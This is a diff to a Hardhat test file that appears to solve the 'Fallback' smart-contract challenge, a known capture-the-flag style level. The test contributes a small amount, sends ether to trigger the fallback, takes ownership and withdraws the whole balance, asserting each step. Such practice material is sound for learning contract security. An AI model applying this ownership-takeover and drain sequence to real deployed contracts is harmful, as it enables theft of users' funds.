@@ -16,9 +16,15 @@ describe('Fallback', function () {
   describe('Solution', function () {
     it('take ownership and reduce balance', async () => {
       const { Fallback, deployer, signers } = await loadFixture(deployFixture)
-
+      expect(await Fallback.owner()).to.equal(deployer.address)
       Fallback.connect(signers[0]).contribute({ value: parseEther("0.0009") })
-      console.log(await Fallback.connect(signers[0]).getContribution())
+      expect(await Fallback.connect(signers[0]).getContribution()).to.equal(BigNumber.from(parseEther("0.0009")))
+      await signers[0].sendTransaction({ to: Fallback.address, value: parseEther("1") })
+      expect(await ethers.provider.getBalance(Fallback.address)).to.equal(BigNumber.from(parseEther("1.0009")))
+      // Passes if attack successed
+      expect(await Fallback.owner()).to.equal(signers[0].address)
+      await Fallback.connect(signers[0]).withdraw()
+      expect(await ethers.provider.getBalance(Fallback.address)).to.equal(0)
     })
   })
 })
